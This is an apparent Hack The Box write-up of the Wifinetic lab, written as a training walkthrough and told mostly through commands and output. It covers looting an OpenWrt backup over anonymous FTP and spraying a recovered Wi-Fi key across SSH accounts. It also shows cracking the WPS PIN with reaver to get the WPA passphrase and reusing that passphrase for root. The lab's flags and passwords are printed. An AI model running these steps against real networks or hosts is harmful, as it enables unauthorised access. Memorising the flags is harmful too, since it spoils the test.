---
render_with_liquid: false
title: HackTheBox Writeup  Wifinetic
date: 2023-09-18 14:11:47 +1400
tags: [hackthebox, nmap, linux, wifi-hacking, ftp, weak-permissions, openwrt, clear-text-credentials, password-reuse, wps, wpa]
---




# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Wifinetic]
└─$ writehosts htb '10.129.229.90 wifinetic.htb'
+---------+--------+---------------+---------------+
| PROFILE | STATUS |      IP       |    DOMAIN     |
+---------+--------+---------------+---------------+
| htb     | on     | 10.129.229.90 | wifinetic.htb |
+---------+--------+---------------+---------------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Mon Sep 18 14:11:46 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,22,53 wifinetic.htb
Nmap scan report for wifinetic.htb (10.129.229.90)
Host is up, received user-set (0.058s latency).
Scanned at 2023-09-18 14:11:47 CST for 6s

PORT   STATE SERVICE    REASON         VERSION
21/tcp open  ftp        syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
53/tcp open  tcpwrapped syn-ack ttl 63
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Sep 18 14:11:53 2023 -- 1 IP address (1 host up) scanned in 6.18 seconds
```


## 21 - FTP

```bash
┌──(bravosec㉿fsociety)-[~/htb/Wifinetic]
└─$ ftp ftp://anonymous:''@wifinetic.htb
Connected to wifinetic.htb.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls -la
229 Entering Extended Passive Mode (|||45388|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 11 15:25 .
drwxr-xr-x    2 ftp      ftp          4096 Sep 11 15:25 ..
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
ftp> exit
221 Goodbye.
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Wifinetic]
└─$ mkdir loot && cd loot

┌──(bravosec㉿fsociety)-[~/htb/Wifinetic/loot]
└─$ wget -m ftp://anonymous:''@wifinetic.htb
```

# User Flag
---

## Shell as netadmin


### Credential in openwrt config

```bash
┌──(bravosec㉿fsociety)-[~/htb/Wifinetic/loot]
└─$ cd wifinetic.htb

┌──(bravosec㉿fsociety)-[~/htb/Wifinetic/loot/wifinetic.htb]
└─$ ls
backup-OpenWrt-2023-07-26.tar  MigrateOpenWrt.txt         ProjectOpenWRT.pdf
employees_wellness.pdf         ProjectGreatMigration.pdf

┌──(bravosec㉿fsociety)-[~/htb/Wifinetic/loot/wifinetic.htb]
└─$ grep -rin passw
grep: backup-OpenWrt-2023-07-26.tar: binary file matches

┌──(bravosec㉿fsociety)-[~/htb/Wifinetic/loot/wifinetic.htb]
└─$ tar xvf backup-OpenWrt-2023-07-26.tar
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Wifinetic/loot/wifinetic.htb]
└─$ ls -latr
total 2620
-rw-r--r-- 1 bravosec kali   60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r-- 1 bravosec kali 2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r-- 1 bravosec kali    4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r-- 1 bravosec kali   52946 Jul 31 11:03 employees_wellness.pdf
-rw-r--r-- 1 bravosec kali   40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
drwxr-xr-x 7 bravosec kali    4096 Sep 11 23:23 etc
-rw-r--r-- 1 bravosec kali     521 Sep 18 14:12 .listing
drwxr-xr-x 3 bravosec kali    4096 Sep 18 14:12 ..
drwxr-xr-x 3 bravosec kali    4096 Sep 18 14:12 .
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Wifinetic/loot/wifinetic.htb]
└─$ cd etc

┌──(bravosec㉿fsociety)-[~/…/Wifinetic/loot/wifinetic.htb/etc]
└─$ ls
config  dropbear  group  hosts  inittab  luci-uploads  nftables.d  opkg  passwd  profile  rc.local  shells  shinit  sysctl.conf  uhttpd.crt  uhttpd.key

┌──(bravosec㉿fsociety)-[~/…/Wifinetic/loot/wifinetic.htb/etc]
└─$ grep -rin passw
profile:12:export HOME=$(grep -e "^${USER:-root}:" /etc/passwd | cut -d ":" -f 6)
profile:35:There is no root password defined on this device!
profile:36:Use the "passwd" command to set up a new password
config/luci:12: option passwd '/etc/passwd'
config/wireless:23:     option key 'VeRyUniUqWiFIPasswrd1!'
config/wireless:32:     option key 'VeRyUniUqWiFIPasswrd1!'
config/rpcd:7:  option password '$p$root'
config/dropbear:2:      option PasswordAuth 'on'
config/dropbear:3:      option RootPasswordAuth 'on'
```

```bash
┌──(bravosec㉿fsociety)-[~/…/Wifinetic/loot/wifinetic.htb/etc]
└─$ cat config/wireless

config wifi-device 'radio0'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim0'
        option cell_density '0'
        option channel 'auto'
        option band '2g'
        option txpower '20'

config wifi-device 'radio1'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim1'
        option channel '36'
        option band '5g'
        option htmode 'HE80'
        option cell_density '0'

config wifi-iface 'wifinet0'
        option device 'radio0'
        option mode 'ap'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
        option wps_pushbutton '1'

config wifi-iface 'wifinet1'
        option device 'radio1'
        option mode 'sta'
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
```

### Try password reuse on users

Only root was configured to use `ash` according to `passwd` backup file

```bash
┌──(bravosec㉿fsociety)-[~/…/Wifinetic/loot/wifinetic.htb/etc]
└─$ cat passwd|grep sh$
root:x:0:0:root:/root:/bin/ash
```

Root did not use the wifi key as password

```bash
┌──(bravosec㉿fsociety)-[~/…/Wifinetic/loot/wifinetic.htb/etc]
└─$ cssh root@wifinetic.htb 'VeRyUniUqWiFIPasswrd1!'
Warning: Permanently added 'wifinetic.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.
```

Try all possible users

```bash
┌──(bravosec㉿fsociety)-[~/…/Wifinetic/loot/wifinetic.htb/etc]
└─$ cat passwd|cut -d':' -f1
root
daemon
ftp
network
nobody
ntp
dnsmasq
logd
ubus
netadmin
```

Login succussed for user `netadmin`

```bash
┌──(bravosec㉿fsociety)-[~/…/Wifinetic/loot/wifinetic.htb/etc]
└─$ for u in $(cat passwd|cut -d':' -f1); do cssh $u@wifinetic.htb 'VeRyUniUqWiFIPasswrd1!'; done
...
netadmin@wifinetic:~$ id
uid=1000(netadmin) gid=1000(netadmin) groups=1000(netadmin)
netadmin@wifinetic:~$ cat user.txt
6f0ddc97b2cc14a6f50c7b5181269292
netadmin@wifinetic:~$
```

# Root Flag
---

## From netadmin to root


### Enum

View running processes

```bash
netadmin@wifinetic:~$ ps auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
root        3926  0.0  0.0      0     0 ?        I    06:36   0:00  \_ [kworker/0:0]
root           1  0.1  0.2 102844 11736 ?        Ss   06:09   0:02 /sbin/init maybe-ubiquity
root         471  0.1  2.8 188156 114044 ?       S<s  06:09   0:03 /lib/systemd/systemd-journald
root         507  0.0  0.1  22308  5812 ?        Ss   06:09   0:01 /lib/systemd/systemd-udevd
root         723  0.0  0.4 280136 17948 ?        SLsl 06:09   0:00 /sbin/multipathd -d -s
systemd+     757  0.0  0.1  90884  6148 ?        Ssl  06:09   0:00 /lib/systemd/systemd-timesyncd
root         758  0.0  0.0  11356  1616 ?        S<sl 06:09   0:00 /sbin/auditd
root         760  0.0  0.1  76600  4232 ?        S<sl 06:09   0:00  \_ /sbin/audispd
_laurel      763  0.0  0.1  10600  6788 ?        S<   06:09   0:01      \_ /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         792  0.0  0.2  47544 10768 ?        Ss   06:09   0:00 /usr/bin/VGAuthService
root         803  0.1  0.2 237812  8480 ?        Ssl  06:09   0:03 /usr/bin/vmtoolsd
root         811  0.0  0.1  99896  5960 ?        Ssl  06:09   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         936  0.0  0.2 239436  9428 ?        Ssl  06:09   0:00 /usr/lib/accountsservice/accounts-daemon
message+     937  0.0  0.1   7572  4664 ?        Ss   06:09   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         943  0.0  0.1  99896  5800 ?        Ssl  06:09   0:00 /sbin/dhclient wlan1 -v
root         956  0.0  0.0  81960  3700 ?        Ssl  06:09   0:00 /usr/sbin/irqbalance --foreground
root         958  0.0  0.2 236444  9232 ?        Ssl  06:09   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       962  0.0  0.1 224344  4748 ?        Ssl  06:09   0:00 /usr/sbin/rsyslogd -n -iNONE
root         963  0.0  0.9 801388 36632 ?        Ssl  06:09   0:00 /usr/lib/snapd/snapd
root         965  0.0  0.1  17356  7700 ?        Ss   06:09   0:00 /lib/systemd/systemd-logind
root         968  0.0  0.3 395496 13760 ?        Ssl  06:09   0:00 /usr/lib/udisks2/udisksd
root        1003  0.0  0.3 318828 13420 ?        Ssl  06:09   0:00 /usr/sbin/ModemManager
root        1155  0.0  0.0   6816  2888 ?        Ss   06:09   0:00 /usr/sbin/cron -f
root        1161  0.0  0.0   6972  3592 ?        Ss   06:09   0:00 /bin/bash /usr/local/bin/wps_check.sh
root        4317  0.0  0.0   5476   584 ?        S    06:40   0:00  \_ sleep 30
daemon      1166  0.0  0.0   3796  2188 ?        Ss   06:09   0:00 /usr/sbin/atd -f
root        1170  0.0  0.0   6808  2960 ?        Ss   06:09   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root        1192  0.0  0.0   5828  1828 tty1     Ss+  06:09   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
dnsmasq     1195  0.0  0.0  12176  2428 ?        S    06:09   0:00 /usr/sbin/dnsmasq -x /run/dnsmasq/dnsmasq.pid -u dnsmasq -7 /etc/dnsmasq.d,.dpkg-dist,.dpkg-old,.dpkg-new --local-service --trust-anchor=.,203
root        1199  0.0  0.1  12184  7500 ?        Ss   06:09   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        2798  0.1  0.2  13960  8956 ?        Ss   06:24   0:01  \_ sshd: netadmin [priv]
netadmin    2895  0.0  0.1  13960  5956 ?        S    06:24   0:00      \_ sshd: netadmin@pts/0
netadmin    2896  0.0  0.1   8672  5776 pts/0    Ss   06:24   0:00          \_ -bash
netadmin    4326  0.0  0.0   9220  3652 pts/0    R+   06:40   0:00              \_ ps auxf
netadmin    2818  0.0  0.2  19044  9556 ?        Ss   06:24   0:00 /lib/systemd/systemd --user
netadmin    2820  0.0  0.0 104204  3648 ?        S    06:24   0:00  \_ (sd-pam)
root        4281  0.0  0.0  10236  2784 ?        Ss   06:40   0:00 /usr/sbin/hostapd -B -P /run/hostapd.pid -B /etc/hostapd/hostapd.conf
root        4288  0.0  0.2  13936  8908 ?        Ss   06:40   0:00 /sbin/wpa_supplicant -u -s -c /etc/wpa_supplicant.conf -i wlan1
```

According to teh result, target is running `hostapd`, `wpa_supplicant`, `wps_check.sh` , which means it might be running a wifi hotspot

View interfaces

```bash
netadmin@wifinetic:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:70:b5 brd ff:ff:ff:ff:ff:ff
    inet 10.129.229.90/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3338sec preferred_lft 3338sec
    inet6 dead:beef::250:56ff:feb9:70b5/64 scope global dynamic mngtmpaddr
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:feb9:70b5/64 scope link
       valid_lft forever preferred_lft forever
3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.1/24 brd 192.168.1.255 scope global wlan0
       valid_lft forever preferred_lft forever
    inet6 fe80::ff:fe00:0/64 scope link
       valid_lft forever preferred_lft forever
4: wlan1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.23/24 brd 192.168.1.255 scope global dynamic wlan1
       valid_lft 41626sec preferred_lft 41626sec
    inet6 fe80::ff:fe00:100/64 scope link
       valid_lft forever preferred_lft forever
5: wlan2: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
6: hwsim0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ieee802.11/radiotap 12:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
7: mon0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
```

There's 3 wireless adapters and 1 `mon0` in monitor mode

Scan for access points from those adapters

```bash
netadmin@wifinetic:~$ iwlist wlan1 scan
wlan1     Scan completed :
          Cell 01 - Address: 02:00:00:00:00:00
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"OpenWrt"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=0006059c6f1c23d0
                    Extra: Last beacon: 4ms ago
                    IE: Unknown: 00074F70656E577274
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD5C0050F204104A0001101044000102103B00010310470010362DB47BA53A519188FB5458B986B2E41021000120102300012010240001201042000120105400080000000000000000101100012010080002210C1049000600372A000120
```

- There's 1 ESSID called `OpenWrt` with the BSSID `02:00:00:00:00:00` on `wlan1`

### Use Reaver to crack WPS

Did some common enumerations such as `SUDO`, `suid`, `crontabs`, found capabilities result interesting

```bash
netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

> The tool `reaver` is for attacking **WPS** (Wifi Protected Setup) to recover **WPA/WPA2 passphrases**

```bash
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```


### Password reuse on root

```bash
cssh root@wifinetic.htb 'WhatIsRealAnDWhAtIsNot51121!'
```

```bash
root@wifinetic:~# id
uid=0(root) gid=0(root) groups=0(root)
root@wifinetic:~# cat /root/root.txt
07a2766c1dc21024f4fdf2e0bd8d3b7c
```

# Additional
---
